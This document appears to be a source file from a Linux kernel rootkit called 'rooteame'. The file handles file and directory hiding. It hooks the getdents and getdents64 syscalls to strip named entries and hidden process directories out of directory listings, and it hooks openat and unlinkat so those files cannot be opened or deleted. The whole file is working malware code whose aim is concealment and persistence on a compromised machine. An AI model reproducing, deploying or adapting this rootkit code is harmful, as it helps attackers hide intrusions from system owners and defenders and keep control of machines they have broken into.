/* rooteame - file_hide.c
 * File and directory hiding via getdents/getdents64 hook
 * Also protects hidden files from openat
 * ruby570bocadito © 2026
 */
#include "core.h"

char hidden_files[MAX_HIDDEN_FILES][256];
int hidden_file_count = 0;
static DEFINE_SPINLOCK(file_hide_lock);

void file_hide_add(const char *name) {
    unsigned long flags;
    spin_lock_irqsave(&file_hide_lock, flags);
    if (hidden_file_count < MAX_HIDDEN_FILES) {
        strncpy(hidden_files[hidden_file_count], name, 255);
        hidden_files[hidden_file_count][255] = '\0';
        hidden_file_count++;
        pr_info(ROOTEAME_TAG " hiding file/dir: %s\n", name);
    }
    spin_unlock_irqrestore(&file_hide_lock, flags);
}

void file_hide_del(const char *name) {
    unsigned long flags;
    int i;
    spin_lock_irqsave(&file_hide_lock, flags);
    for (i = 0; i < hidden_file_count; i++) {
        if (strcmp(hidden_files[i], name) == 0) {
            memmove(hidden_files[i], hidden_files[i+1],
                    (hidden_file_count - i - 1) * 256);
            hidden_file_count--;
            pr_info(ROOTEAME_TAG " unhid file/dir: %s\n", name);
            break;
        }
    }
    spin_unlock_irqrestore(&file_hide_lock, flags);
}

static int should_hide_file(const char *name) {
    unsigned long flags;
    int i, hide = 0;

    /* Check if this is a /proc PID directory */
    if (is_proc_pid_hidden(name))
        return 1;

    spin_lock_irqsave(&file_hide_lock, flags);
    for (i = 0; i < hidden_file_count; i++) {
        /* Exact filename match */
        if (strcmp(name, hidden_files[i]) == 0) {
            hide = 1;
            break;
        }
        /* Path-based match: if hidden string contains '/', do substring */
        if (strchr(hidden_files[i], '/') && strstr(name, hidden_files[i])) {
            hide = 1;
            break;
        }
    }
    spin_unlock_irqrestore(&file_hide_lock, flags);
    return hide;
}

int is_file_hidden(const char *name) {
    return should_hide_file(name);
}

/* ================================================================
 * getdents64 hook — filter directory listing
 * ================================================================ */
asmlinkage long hooked_getdents64(unsigned int fd,
                                   struct linux_dirent64 __user *dirp,
                                   unsigned int count) {
    long ret, bytes_copied;
    struct linux_dirent64 *kdirp, *entry, *prev;
    unsigned short reclen;

    long (*orig_getdents64)(unsigned int, struct linux_dirent64 __user *, unsigned int);
    orig_getdents64 = (void *)hooks[HOOKIDX_GETDENTS64].original;

    ret = orig_getdents64(fd, dirp, count);
    if (ret <= 0)
        return ret;

    kdirp = kmalloc(ret, GFP_KERNEL);
    if (!kdirp)
        return ret;

    if (copy_from_user(kdirp, dirp, ret)) {
        kfree(kdirp);
        return ret;
    }

    bytes_copied = 0;
    entry = kdirp;
    prev = NULL;

    while ((void *)entry < (void *)kdirp + ret) {
        reclen = entry->d_reclen;

        if (should_hide_file(entry->d_name)) {
            /* Remove this entry */
            if (prev) {
                prev->d_reclen += reclen;
            }
            entry = (struct linux_dirent64 *)((char *)entry + reclen);
            continue;
        }

        bytes_copied += reclen;
        prev = entry;
        entry = (struct linux_dirent64 *)((char *)entry + reclen);
    }

    if (bytes_copied > 0 && bytes_copied < ret) {
        /* Set last entry d_reclen to consume remaining buffer */
        if (prev) {
            prev->d_reclen += (ret - bytes_copied);
        }
        ret = bytes_copied;
    }

    if (copy_to_user(dirp, kdirp, ret)) {
        kfree(kdirp);
        return -EFAULT;
    }

    kfree(kdirp);
    return ret;
}

/* ================================================================
 * getdents (32-bit compat) hook
 * ================================================================ */
asmlinkage long hooked_getdents(unsigned int fd,
                                  struct linux_dirent __user *dirp,
                                  unsigned int count) {
    long ret, bytes_copied;
    struct linux_dirent *kdirp, *entry, *prev;
    unsigned short reclen;

    long (*orig_getdents)(unsigned int, struct linux_dirent __user *, unsigned int);
    orig_getdents = (void *)hooks[HOOKIDX_GETDENTS].original;

    ret = orig_getdents(fd, dirp, count);
    if (ret <= 0)
        return ret;

    kdirp = kmalloc(ret, GFP_KERNEL);
    if (!kdirp)
        return ret;

    if (copy_from_user(kdirp, dirp, ret)) {
        kfree(kdirp);
        return ret;
    }

    bytes_copied = 0;
    entry = kdirp;
    prev = NULL;

    while ((void *)entry < (void *)kdirp + ret) {
        reclen = entry->d_reclen;

        if (should_hide_file(entry->d_name)) {
            if (prev) {
                prev->d_reclen += reclen;
            }
            entry = (struct linux_dirent *)((char *)entry + reclen);
            continue;
        }

        bytes_copied += reclen;
        prev = entry;
        entry = (struct linux_dirent *)((char *)entry + reclen);
    }

    if (bytes_copied > 0 && bytes_copied < ret) {
        if (prev)
            prev->d_reclen += (ret - bytes_copied);
        ret = bytes_copied;
    }

    if (copy_to_user(dirp, kdirp, ret)) {
        kfree(kdirp);
        return -EFAULT;
    }

    kfree(kdirp);
    return ret;
}

/* ================================================================
 * openat hook — block access to hidden files
 * ================================================================ */
asmlinkage long hooked_openat(int dirfd, const char __user *pathname,
                               int flags, umode_t mode) {
    char kpath[256];
    char *filename;

    long (*orig_openat)(int, const char __user *, int, umode_t);
    orig_openat = (void *)hooks[HOOKIDX_OPENAT].original;

    if (pathname) {
        if (strncpy_from_user(kpath, pathname, sizeof(kpath) - 1) > 0) {
            kpath[sizeof(kpath) - 1] = '\0';
            /* Extract filename from path */
            filename = strrchr(kpath, '/');
            if (filename)
                filename++;
            else
                filename = kpath;

            if (should_hide_file(filename) || should_hide_file(kpath)) {
                return -ENOENT;
            }
        }
    }

    return orig_openat(dirfd, pathname, flags, mode);
}

/* ================================================================
 * unlinkat hook — prevent deletion of hidden files
 * ================================================================ */
asmlinkage long hooked_unlinkat(int dirfd, const char __user *pathname,
                                  int flags) {
    char kpath[256];
    char *filename;

    long (*orig_unlinkat)(int, const char __user *, int);
    orig_unlinkat = (void *)hooks[HOOKIDX_UNLINKAT].original;

    if (pathname) {
        if (strncpy_from_user(kpath, pathname, sizeof(kpath) - 1) > 0) {
            kpath[sizeof(kpath) - 1] = '\0';
            filename = strrchr(kpath, '/');
            if (filename) filename++; else filename = kpath;

            if (should_hide_file(filename) || should_hide_file(kpath)) {
                return -ENOENT;
            }
        }
    }

    return orig_unlinkat(dirfd, pathname, flags);
}

int file_hide_init(void) {
    pr_info(ROOTEAME_TAG " file hiding initialized (max=%d)\n", MAX_HIDDEN_FILES);
    return 0;
}

void file_hide_cleanup(void) {
    hidden_file_count = 0;
    pr_info(ROOTEAME_TAG " file hiding cleaned\n");
}
